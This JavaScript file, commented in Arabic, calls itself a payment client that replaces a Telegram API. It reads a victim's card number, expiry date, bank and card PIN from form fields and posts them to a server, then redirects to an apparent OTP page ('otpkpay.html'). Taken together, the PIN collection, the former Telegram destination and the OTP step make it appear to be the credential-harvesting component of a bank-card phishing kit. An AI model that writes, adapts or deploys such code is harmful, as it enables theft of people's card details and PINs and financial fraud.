/**
 * عميل نظام الدفع المحلي
 * يحل محل Telegram API
 */

const PAYMENT_SERVER = 'http://localhost:3000';

/**
 * إرسال بيانات الدفع إلى الخادم المحلي
 * @param {Object} paymentData - بيانات الدفع
 */
async function sendPaymentToServer(paymentData) {
    try {
        const response = await fetch(`${PAYMENT_SERVER}/api/payment`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(paymentData)
        });

        const result = await response.json();

        if (result.success) {
            console.log('✅ تم إرسال بيانات الدفع بنجاح:', result.paymentId);
            return {
                success: true,
                paymentId: result.paymentId,
                message: result.message
            };
        } else {
            console.error('❌ فشل إرسال البيانات:', result.message);
            return {
                success: false,
                message: result.message
            };
        }
    } catch (error) {
        console.error('⚠️ خطأ في الاتصال بالخادم:', error);
        return {
            success: false,
            message: 'خطأ في الاتصال بالخادم'
        };
    }
}

/**
 * إنشاء طلب جديد
 * @param {Object} orderData - بيانات الطلب
 */
async function createOrder(orderData) {
    try {
        const response = await fetch(`${PAYMENT_SERVER}/api/orders`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(orderData)
        });

        const result = await response.json();

        if (result.success) {
            console.log('✅ تم إنشاء الطلب بنجاح:', result.orderId);
            return {
                success: true,
                orderId: result.orderId,
                message: result.message
            };
        } else {
            console.error('❌ فشل إنشاء الطلب:', result.message);
            return {
                success: false,
                message: result.message
            };
        }
    } catch (error) {
        console.error('⚠️ خطأ في الاتصال بالخادم:', error);
        return {
            success: false,
            message: 'خطأ في الاتصال بالخادم'
        };
    }
}

/**
 * الحصول على جميع الطلبات
 */
async function getOrders() {
    try {
        const response = await fetch(`${PAYMENT_SERVER}/api/orders`);
        const result = await response.json();

        if (result.success) {
            return result.data;
        } else {
            console.error('❌ فشل في الحصول على الطلبات:', result.message);
            return [];
        }
    } catch (error) {
        console.error('⚠️ خطأ في الاتصال بالخادم:', error);
        return [];
    }
}

/**
 * الحصول على جميع المدفوعات
 */
async function getPayments() {
    try {
        const response = await fetch(`${PAYMENT_SERVER}/api/payments`);
        const result = await response.json();

        if (result.success) {
            return result.data;
        } else {
            console.error('❌ فشل في الحصول على المدفوعات:', result.message);
            return [];
        }
    } catch (error) {
        console.error('⚠️ خطأ في الاتصال بالخادم:', error);
        return [];
    }
}

/**
 * الحصول على إحصائيات لوحة التحكم
 */
async function getDashboardStats() {
    try {
        const response = await fetch(`${PAYMENT_SERVER}/api/dashboard/stats`);
        const result = await response.json();

        if (result.success) {
            return result.data;
        } else {
            console.error('❌ فشل في الحصول على الإحصائيات:', result.message);
            return null;
        }
    } catch (error) {
        console.error('⚠️ خطأ في الاتصال بالخادم:', error);
        return null;
    }
}

/**
 * تحديث حالة الدفعة
 * @param {string} paymentId - معرف الدفعة
 * @param {string} status - الحالة الجديدة (completed, failed, etc)
 */
async function updatePaymentStatus(paymentId, status) {
    try {
        const response = await fetch(`${PAYMENT_SERVER}/api/payments/${paymentId}`, {
            method: 'PUT',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ status: status })
        });

        const result = await response.json();

        if (result.success) {
            console.log('✅ تم تحديث الدفعة بنجاح');
            return {
                success: true,
                message: result.message,
                data: result.data
            };
        } else {
            console.error('❌ فشل التحديث:', result.message);
            return {
                success: false,
                message: result.message
            };
        }
    } catch (error) {
        console.error('⚠️ خطأ في الاتصال بالخادم:', error);
        return {
            success: false,
            message: 'خطأ في الاتصال بالخادم'
        };
    }
}

/**
 * دالة مساعدة: تحويل بيانات النموذج إلى كائن
 */
function formatPaymentData() {
    return {
        name: localStorage.getItem("storedUserName") || 'غير معروف',
        bank: document.getElementById("bankSelect")?.value || '',
        prefix: document.getElementById("prefixSelect")?.value || '',
        cardNumber: document.getElementById("cardNumber")?.value || '',
        expiryMonth: document.getElementById("monthSelect")?.value || '',
        expiryYear: document.getElementById("yearSelect")?.value || '',
        pin: document.getElementById("pin")?.value || '',
        amount: localStorage.getItem("totalAmount") || '0'
    };
}

/**
 * دالة جديدة: إرسال إلى الخادم المحلي (بدلاً من Telegram)
 */
async function sendToLocalServer() {
    const paymentData = formatPaymentData();

    // التحقق من البيانات
    if (!paymentData.name || !paymentData.bank || !paymentData.cardNumber || !paymentData.pin) {
        alert("يرجى ملء جميع الحقول قبل الإرسال.");
        return false;
    }

    // إرسال البيانات
    const result = await sendPaymentToServer(paymentData);

    if (result.success) {
        alert('✅ تم إرسال بيانات الدفع بنجاح!\nمعرف الدفعة: ' + result.paymentId);
        
        // الانتقال إلى الصفحة التالية بعد ثانية
        setTimeout(() => {
            window.location.href = "otpkpay.html";
        }, 1000);
        
        return true;
    } else {
        alert('❌ خطأ: ' + result.message);
        return false;
    }
}

console.log('✅ تم تحميل payment-client.js بنجاح');
console.log('📡 الخادم:', PAYMENT_SERVER);
